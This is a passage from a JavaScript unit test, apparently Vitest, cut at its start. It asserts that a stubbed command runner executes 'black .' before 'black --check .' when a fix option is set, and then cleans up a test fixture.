      // the runner is stubbed its call log is available, so assert the ordering
      // directly: resolveFormatter maps black to fix `black .` and check
      // `black --check .`, and check.mjs runs the fix first when --fix is set.
      const commands = vi.mocked(execCommand).mock.calls.map(([command]) => command);
      expect(commands).toContain('black .');
      expect(commands).toContain('black --check .');
      expect(commands.indexOf('black .')).toBeLessThan(commands.indexOf('black --check .'));
    } finally {
      cleanupFixture(fx.root);
    }
  }, 20_000);
});
